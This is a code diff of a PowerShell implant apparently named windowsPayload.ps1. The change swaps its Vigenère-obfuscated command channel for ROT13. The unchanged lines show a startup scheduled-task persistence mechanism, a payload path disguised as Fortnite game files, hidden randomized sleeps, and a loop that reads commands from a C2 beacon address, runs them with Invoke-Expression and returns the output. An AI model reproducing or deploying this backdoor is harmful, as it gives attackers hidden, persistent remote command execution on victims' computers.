@@ -3,6 +3,27 @@ param(
     [string]$beaconIPAddress
 )
 
+function Convert-ROT13 {
+    param (
+        [string]$InputString
+    )
+    
+    $Alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
+    $Cipher = 'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'
+    $OutputString = ''
+
+    foreach ($Char in $InputString.ToCharArray()) {
+        if ($Alphabet.Contains($Char)) {
+            $Index = $Alphabet.IndexOf($Char)
+            $OutputString += $Cipher[$Index]
+        } else {
+            $OutputString += $Char
+        }
+    }
+
+    return $OutputString
+}
+
 # Create scheduled task for this payload to run on boot
 $action = New-ScheduledTaskAction -Execute "C:\ProgramData\EpicGames\Fortnite\windowsPayload.ps1"
 $trigger = New-ScheduledTaskTrigger -AtStartup
@@ -76,77 +97,14 @@ while($true){
     $sleepTime = Get-Random -Minimum 5 -Maximum 60
     Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-Command Start-Sleep -Seconds $($sleepTime)"
 
-    $key = "SuPeRSecReTKey";
-    # Function to encrypt the plaintext using the Vigenère cipher
-    function Update-EncryptVigenereCipher {
-        param (
-            [string]$plaintext,
-            [string]$key
-        )
-
-        $encryptedText = ""
-        $key = $key.ToLower()
-        $keyLength = $key.Length
-        $keyIndex = 0
-
-        foreach ($char in $plaintext.ToCharArray()) {
-            if ($char -match '[a-zA-Z]') {
-                $shift = [int][char]$key[$keyIndex % $keyLength] - [int][char]'a'
-                if ($char -match '[a-z]') {
-                    $encryptedChar = [char]((( [int][char]$char - [int][char]'a' + $shift) % 26) + [int][char]'a')
-                    $encryptedText += $encryptedChar
-                } elseif ($char -match '[A-Z]') {
-                    $encryptedChar = [char]((( [int][char]$char - [int][char]'A' + $shift) % 26) + [int][char]'A')
-                    $encryptedText += $encryptedChar
-                }
-                $keyIndex++
-            } else {
-                # Non-alphabetic characters are added without encryption
-                $encryptedText += $char
-            }
-        }
-        return $encryptedText
-    }
-
-    # Function to decrypt the ciphertext using the Vigenère cipher
-    function Update-DecryptVigenereCipher {
-        param (
-            [string]$ciphertext,
-            [string]$key
-        )
-
-        $decryptedText = ""
-        $key = $key.ToLower()
-        $keyLength = $key.Length
-        $keyIndex = 0
-
-        foreach ($char in $ciphertext.ToCharArray()) {
-            if ($char -match '[a-zA-Z]') {
-                $shift = [int][char]$key[$keyIndex % $keyLength] - [int][char]'a'
-                if ($char -match '[a-z]') {
-                    $decryptedChar = [char]((( [int][char]$char - [int][char]'a' - $shift + 26) % 26) + [int][char]'a')
-                    $decryptedText += $decryptedChar
-                } elseif ($char -match '[A-Z]') {
-                    $decryptedChar = [char]((( [int][char]$char - [int][char]'A' - $shift + 26) % 26) + [int][char]'A')
-                    $decryptedText += $decryptedChar
-                }
-                $keyIndex++
-            } else {
-                # Non-alphabetic characters are added without decryption
-                $decryptedText += $char
-            }
-        }
-        return $decryptedText
-    }
-
     # Get commands from the C2, run them and send the output back
     $command = $reader.ReadLine()
-    $command = Update-DecryptVigenereCipher -ciphertext $command -key $key
+    $command = Convert-ROT13 $command
     $reply = Invoke-Expression $command
     if($reply.GetType().Name -ne "String"){
         $reply = $reply | Out-String
     }
-    $reply = Update-EncryptVigenereCipher -plaintext $reply -key $key
+    $reply = Convert-ROT13 $reply
     $writer.WriteLine($reply)
     $I++;
 }
